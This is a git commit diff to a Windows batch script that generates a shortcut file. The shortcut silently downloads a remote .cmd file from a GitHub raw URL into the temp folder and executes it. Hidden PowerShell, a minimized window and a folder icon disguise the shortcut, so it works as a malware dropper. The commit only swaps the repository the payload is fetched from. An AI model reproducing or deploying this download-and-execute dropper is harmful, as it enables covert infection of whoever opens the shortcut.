021d93fd68aae4e305795e3d5b00236503e1dd4c
bangwonie <loc.ng@hyperpulse.group>
2026-05-23 12:36:17 +0700

    update final proper lnk file pointing to rtyui

--- Create-LNK-VBS.cmd
+++ Create-LNK-VBS.cmd
@@ -9,7 +9,7 @@ echo Creating independent shortcut %SC_NAME%...
 echo Set ws = CreateObject("WScript.Shell") > make_sc.vbs
 echo Set lnk = ws.CreateShortcut("%~dp0%SC_NAME%") >> make_sc.vbs
 echo lnk.TargetPath = "cmd.exe" >> make_sc.vbs
-echo lnk.Arguments = "/c powershell.exe -w hidden -c ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tiiisiet65-sudo/LoioioNoaisK/main/Download-macOSx.cmd' -OutFile $env:TEMP\s.cmd; & $env:TEMP\s.cmd""" >> make_sc.vbs
+echo lnk.Arguments = "/c powershell.exe -w hidden -c ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tiiisiet65-sudo/rtyui/main/Download-macOSx.cmd' -OutFile $env:TEMP\s.cmd; & $env:TEMP\s.cmd""" >> make_sc.vbs
 echo lnk.IconLocation = "shell32.dll,4" >> make_sc.vbs
 echo lnk.WindowStyle = 7 >> make_sc.vbs
 echo lnk.Save >> make_sc.vbs
